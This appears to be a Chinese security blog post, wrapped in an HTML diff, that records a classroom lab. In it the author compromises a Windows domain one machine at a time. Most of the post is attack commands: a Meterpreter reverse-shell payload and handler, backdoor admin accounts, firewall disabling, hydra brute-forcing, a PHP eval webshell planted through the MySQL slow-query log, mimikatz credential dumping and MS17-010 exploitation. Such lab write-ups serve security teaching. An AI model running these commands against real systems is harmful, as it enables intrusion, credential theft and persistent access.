@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="h1tler's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="通过普通域用户的机器的控制权，在防火墙的限制下，一步一步渗透整个域环境。班级老师布置的一次实验，我记录了一下这次实验的过程然后分享出来，供小白参考，望大牛忽喷。 域环境简介A组：1号机（域成员）：用户名 win_10_1 &amp;#160;&amp;#160;&amp;#160;主机名 win_10_1 &amp;#160;&amp;#160;&amp;#160;&amp;#160;ip地址:192.168.135.12号机（域成员）：用户名 win">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域环境综合渗透过程">
+<meta property="og:url" content="http://www.cuittk.cn/2018/11/15/域环境综合渗透过程/index.html">
+<meta property="og:site_name" content="h1tler&#39;s blog">
+<meta property="og:description" content="通过普通域用户的机器的控制权，在防火墙的限制下，一步一步渗透整个域环境。班级老师布置的一次实验，我记录了一下这次实验的过程然后分享出来，供小白参考，望大牛忽喷。 域环境简介A组：1号机（域成员）：用户名 win_10_1 &amp;#160;&amp;#160;&amp;#160;主机名 win_10_1 &amp;#160;&amp;#160;&amp;#160;&amp;#160;ip地址:192.168.135.12号机（域成员）：用户名 win">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/vmo6tbrh5093h6k9sd4yefknh4.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/070r232qxvtpgxcw57uyp7sexw.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/agofsr2jai8s38gnw29x7ncihe.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/skuabas37a3pid904sm0ziqbk2.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/ilg1d8oh6cu9pagbqpmso6ed34.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/lk91aetlad5tg7g6qs8v6vrqz1.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/0g3ggostpgugzq56iv8kpmgarw.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/liiqkqnalfecd475ejxlhxk2tv.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/oz0y2yma8xgviav8izpwgn08du.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/qkadegarjagzxzqhazo4pnf6la.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/lhu1zjdtif869u3fnayh10g22o.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/32bsfy7hjasdzydq1b4e2v2hux.png">
+<meta property="og:updated_time" content="2018-11-16T10:24:50.707Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域环境综合渗透过程">
+<meta name="twitter:description" content="通过普通域用户的机器的控制权，在防火墙的限制下，一步一步渗透整个域环境。班级老师布置的一次实验，我记录了一下这次实验的过程然后分享出来，供小白参考，望大牛忽喷。 域环境简介A组：1号机（域成员）：用户名 win_10_1 &amp;#160;&amp;#160;&amp;#160;主机名 win_10_1 &amp;#160;&amp;#160;&amp;#160;&amp;#160;ip地址:192.168.135.12号机（域成员）：用户名 win">
+<meta name="twitter:image" content="http://img.cdn.cuittk.cn/vmo6tbrh5093h6k9sd4yefknh4.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.cuittk.cn/2018/11/15/域环境综合渗透过程/"/>
+
+
+
+
+
+  <title>域环境综合渗透过程 | h1tler's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h1tler's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/15/域环境综合渗透过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="h1tler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h1tler's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">域环境综合渗透过程</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-15T14:42:08+08:00">
+                2018-11-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://img.cdn.cuittk.cn/vmo6tbrh5093h6k9sd4yefknh4.png" alt=""><br>通过普通域用户的机器的控制权，在防火墙的限制下，一步一步渗透整个域环境。<br>班级老师布置的一次实验，我记录了一下这次实验的过程然后分享出来，供小白参考，望大牛忽喷。</p>
+<h3 id="域环境简介"><a href="#域环境简介" class="headerlink" title="域环境简介"></a>域环境简介</h3><p>A组：<br>1号机（域成员）：用户名 win_10_1 &#160;&#160;&#160;主机名 win_10_1 &#160;&#160;&#160;&#160;ip地址:192.168.135.1<br>2号机（域成员）：用户名 win_7_2 &#160;&#160;&#160;&#160;&#160;主机名 win_7_2 &#160;&#160;&#160;&#160;&#160;&#160;ip地址:192.168.135.2<br>3号机（ 域控 ）&#160;：用户名 win_2012_3     主机名 win_2012_3  ip地址:192.168.135.3<br>4号机（域成员）：用户名 win_2003_4     主机名 win_2003_4  ip地址:192.168.135.4<br>5号机（域成员）：用户名 win_2008_5     主机名 win_2008_5  ip地址:192.168.135.5<br>6号机（域成员）：用户名 win_2008_6     主机名 win_2008_6  ip地址:192.168.135.6<br>B组：<br>Kali攻击机 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip地址：192.168.135.106<br>Windows10 攻击机 ip地址：192.168.135.102<br>其实攻击机都应该使用公网ip，本次渗透就简单采用私有ip。<br>可以只用kail的，为了方便多用个windows 10攻击机。</p>
+<h3 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h3><h4 id="利用msf生成攻击木马-，2号机运行，获取2号机权限"><a href="#利用msf生成攻击木马-，2号机运行，获取2号机权限" class="headerlink" title="利用msf生成攻击木马 ，2号机运行，获取2号机权限"></a>利用msf生成攻击木马 ，2号机运行，获取2号机权限</h4><p>攻击机kali 通过msfvenom生成test.exe<br>生成木马：<br><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.135.106 LPORT=1234 -f exe &gt; ./test.exe</code><br>实际LHOST应该为公网ip<br>木马传入2号机<br>打开Metaspoit。监听1234端口，进行攻击。<br><code>sudo msfconsole</code><br><code>use exploit/multi/handler</code><br><code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br><code>set LHOST 192.168.135.106</code><br><code>set LPORT 1234</code><br><code>exploit</code><br>2号机上运行test.exe获取到shell<br><img src="http://img.cdn.cuittk.cn/070r232qxvtpgxcw57uyp7sexw.png" alt=""><br>上传端口转发工具htran.exe并转发出3389端口<br>meterpreter&gt;<code>upload /root/Desktop/htran.exe C:\\Users\\win_7_2\\Desktop\\htran.exe</code><br>meterpreter&gt;shell<br>创建用户并加入管理员组<br><code>net user hacker Qwer123456 /add</code><br><code>net localgroup administrators hacker /add</code><br>开启2号机的3389命令<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>关闭防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>运行端口转发程序，转发到windows10攻击机上：<br><code>htran.exe -p -slave 192.168.135.102 2048 192.168.135.2 3389</code><br>实际转发出的ip应该为公网ip<br>windows10攻击机本地端口监听<br><code>./htran.exe -p -listen 2048 10000</code><br>windows10攻击机本地连接10000端口，得到2号机的3389<br><img src="http://img.cdn.cuittk.cn/agofsr2jai8s38gnw29x7ncihe.png" alt=""></p>
+<h4 id="攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令"><a href="#攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令" class="headerlink" title="攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令"></a>攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令</h4><p>连接上反弹回来的2号机的3389端口，上传hydra.exe爆破工具。<br>通过工具爆破sa的密码，然后sqlserver提权拿到6号机。<br>hydra.exe -l sa -P d:\pass.txt 192.168.135.6 mssql<br><img src="http://img.cdn.cuittk.cn/skuabas37a3pid904sm0ziqbk2.png" alt=""><br>爆破得到密码为Www123456<br>使用sqltools工具连接192.168.135.6<br>创建用户并加入管理员组<br><img src="http://img.cdn.cuittk.cn/ilg1d8oh6cu9pagbqpmso6ed34.png" alt=""><br>开启6号机的3389端口命令<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>关闭防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>上传端口转发工具htran.exe让6号机转出3389端口<br><code>htran.exe -p -slave 192.168.135.102 2049 192.168.135.6 3389</code><br>windows10攻击机本地端口监听<br><code>./htran.exe -p -listen 2049 10001</code><br>windows10攻击机本地连接10001端口，得到6号机的3389<br><img src="http://img.cdn.cuittk.cn/lk91aetlad5tg7g6qs8v6vrqz1.png" alt=""></p>
+<h4 id="攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。"><a href="#攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。" class="headerlink" title="攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。"></a>攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。</h4><p>连接上反弹回来的6号机的3389端口。<br>在6号机上访问5号机<br><img src="http://img.cdn.cuittk.cn/0g3ggostpgugzq56iv8kpmgarw.png" alt=""><br>phpmyadmin后台登陆密码弱口令，root,root。在网站的探针中处找到phpstudy的绝对路径为C:/Program Files/WWW/<br>使用常用的修改查询日志的方法getshell<br><code>show variables like &#39;%general%&#39;;</code><br><code>set global general_log = on;</code><br><code>set global general_log_file = &#39;C:/Program Files/WWW/shell.php&#39;;</code><br><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code><br>失败</p>
+<p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志等。<br>要突破secure_file_priv写shell<br>主要利用慢查询日志来写shell<br>设置slow_query_log=1.即启用慢查询日志(默认禁用)。<br>set global slow_query_log=1;<br>伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名<br>set global slow_query_log_file=’C:/Program Files/WWW/shell.php’;<br>select ‘&lt;?php eval($_POST[cmd]);?&gt;’ or sleep(11);        #必须要有or sleep(11)<br>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间（默认10秒）时,该语句才会被记入进慢查询日志。<br>6号机上安装菜刀，使用菜刀连接<br><img src="http://img.cdn.cuittk.cn/liiqkqnalfecd475ejxlhxk2tv.png" alt=""><br>新建用户并加入管理员组，开5号机3389端口，关闭防火墙，5号机转出3389，代码同上。</p>
+<h4 id="攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞"><a href="#攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞" class="headerlink" title="攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞"></a>攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞</h4><p>连接上反弹回来的5号机的3389端口，登陆5号机。<br>使用ms17010攻击4号机。<br>5号机上传test.exe木马，kali中监听1234端口<br><code>sudo msfconsole</code><br><code>use exploit/multi/handler</code><br><code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br><code>set LHOST 192.168.135.106</code><br><code>set LPORT 1234</code><br><code>exploit</code><br>5号机运行test.exe木马kali中获取5号机器的shell</p>
+<p>先设置路由<br>meterpreter&gt; run get_local_subnets                    （获取当前路由）<br>meterpreter&gt; run autoroute -s 192.168.135.0/24    （添加路由）<br>meterpreter&gt; run autoroute -p                         （查看已添加路由）<br>meterpreter&gt;background                                （退到后台）<br>攻击正式开始<br>第一步：use exploit/windows/smb/ms17_010_psexec（切换到攻击模块）<br>第二步：set rhost 192.168.135.4（设置存在445漏洞的PC电脑IP）<br>第三步：set lport 4444            （设置反弹监听端口）<br>第四步：新开一个msf监听4444端口<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.135.106<br>set LPORT 4444<br>exploit<br>第五步：exploit（执行攻击）<br>第六步：攻击完成，新开的msf返回一个shell控制台（如下图）<br><img src="http://img.cdn.cuittk.cn/oz0y2yma8xgviav8izpwgn08du.png" alt=""><br>shell命令后在4号机上创建用户，开启3389端口，关闭防火墙，代码同上。</p>
+<h4 id="攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。"><a href="#攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。" class="headerlink" title="攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。"></a>攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。</h4><p>使用msf17010打3号机域控。<br>拿到4号的3389后，因为3号用域控账号通过3389登陆过4号，因此上传mimikatz到4号机，抓取域控密码<br><img src="http://img.cdn.cuittk.cn/qkadegarjagzxzqhazo4pnf6la.png" alt=""><br>域控用户为Administrator，域为QWEROK，密码为Qwer#w12#03<br>4号机上传test.exe木马，kali中监听1234端口，使用msf17010攻击3号机<br>获取shell后：添加路由规则<br>meterpreter&gt; run autoroute -s 192.168.135.0/24<br>meterpreter&gt;background                                （退到后台）<br>攻击正式开始<br>第一步：use exploit/windows/smb/ms17_010_psexec（切换到攻击模块）<br>第二步：set rhost 192.168.135.3（攻击域控对4号机开放的445端口）<br>第三步：set lport 4445            （设置反弹监听端口）<br>第四步：新开一个msf监听4445端口<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.135.106<br>set LPORT 4445<br>exploit<br>第五步：exploit（执行攻击）<br>第六步：攻击完成，新开的msf返回一个shell控制台（如下图）<br>反弹出3号机的3389端口。使用administrator登陆域控。<br><img src="http://img.cdn.cuittk.cn/lhu1zjdtif869u3fnayh10g22o.png" alt=""></p>
+<h4 id="攻击1号机（win10）只对3号开放445端口"><a href="#攻击1号机（win10）只对3号开放445端口" class="headerlink" title="攻击1号机（win10）只对3号开放445端口"></a>攻击1号机（win10）只对3号开放445端口</h4><p>利用域控的用户名和密码，使用ms17010攻击1号机。<br>获得到3号机的3389，直接连接上传test.exe木马<br>获取shell后：添加路由规则<br>meterpreter&gt; run autoroute -s 192.168.135.0/24<br>use exploit/windows/smb/ms17_010_psexec<br>set lhost 192.168.135.106<br>set RHOST 192.168.135.1<br>set SMBUser Administrator<br>set SMBPass Qwer#w12#03<br>set SMBDomain qwerok.com<br>set lport 4446<br>同样新开一个msf监听4446端口<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.135.106<br>set LPORT 4446<br>exploit<br>exploit（执行攻击）<br>收到回弹，攻击成功，拿到1号机。<br><img src="http://img.cdn.cuittk.cn/32bsfy7hjasdzydq1b4e2v2hux.png" alt=""><br>创建用户并加入管理员组，开启3389端口，关闭防火墙，代码同上。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有重复造轮子的嫌疑，但是有些文章也没写具体，实际中遇到很多坑。算是给自己写个详细过程，哪天忘记了回来看看。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/c1e4r/articles/8902444.html" target="_blank" rel="external">https://www.cnblogs.com/c1e4r/articles/8902444.html</a><br><a href="https://bbs.ichunqiu.com/article-1500-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/article-1500-1.html</a><br><a href="https://www.fengiling.com/blog/view/?id=702183" target="_blank" rel="external">https://www.fengiling.com/blog/view/?id=702183</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/10/SUCTF 2018 writeup/" rel="next" title="SUCTF 2018 writeup">
+                <i class="fa fa-chevron-left"></i> SUCTF 2018 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/27/第一届安洵杯writeup/" rel="prev" title="第一届安洵杯writeup">
+                第一届安洵杯writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/2.gif"
+              alt="h1tler" />
+          
+            <p class="site-author-name" itemprop="name">h1tler</p>
+            <p class="site-description motion-element" itemprop="description">Youth is wholly experimental</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sancrane.top/" title="sancrane" target="_blank">sancrane</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://myclass.azurewebsites.net/" title="OurClass" target="_blank">OurClass</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://grassgrass.top/" title="grassgrass" target="_blank">grassgrass</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#域环境简介"><span class="nav-number">1.</span> <span class="nav-text">域环境简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透开始"><span class="nav-number">2.</span> <span class="nav-text">渗透开始</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用msf生成攻击木马-，2号机运行，获取2号机权限"><span class="nav-number">2.1.</span> <span class="nav-text">利用msf生成攻击木马 ，2号机运行，获取2号机权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令"><span class="nav-number">2.2.</span> <span class="nav-text">攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。"><span class="nav-number">2.3.</span> <span class="nav-text">攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞"><span class="nav-number">2.4.</span> <span class="nav-text">攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。"><span class="nav-number">2.5.</span> <span class="nav-text">攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击1号机（win10）只对3号开放445端口"><span class="nav-number">2.6.</span> <span class="nav-text">攻击1号机（win10）只对3号开放445端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h1tler</span>
+
+  
+  
+  
+</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1264590843&web_id=1264590843" language="JavaScript"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
